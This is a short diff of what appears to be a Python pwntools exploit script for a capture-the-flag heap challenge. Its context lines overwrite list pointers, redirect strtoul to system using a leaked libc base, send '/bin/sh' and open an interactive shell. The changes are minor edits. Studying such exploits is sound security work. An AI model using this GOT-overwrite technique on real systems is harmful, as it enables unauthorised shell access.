@@ -118,7 +118,6 @@ if __name__ == '__main__':
     s(PAYLOAD) # overwrite [bk]. [fd] should not change.
 
     s('c')
-
     r.clean()
     s('p') # *(CURRENT_RECIPE + 4) == 0x804d048, so 0x804d048 is treated as a listhead 
     resp = r.recvuntil("[q]uit")
@@ -160,7 +159,7 @@ if __name__ == '__main__':
     s(p32(LIBC_BASE+SYSTEM_OFFSET))  # overwrite, now strtoul == system
 
     s('g')
-    s('/bin/sh\0') # doing strtoul('/bin/sh\0') 
+    s('/bin/sh\x00')
     
     r.clean()
     r.interactive()
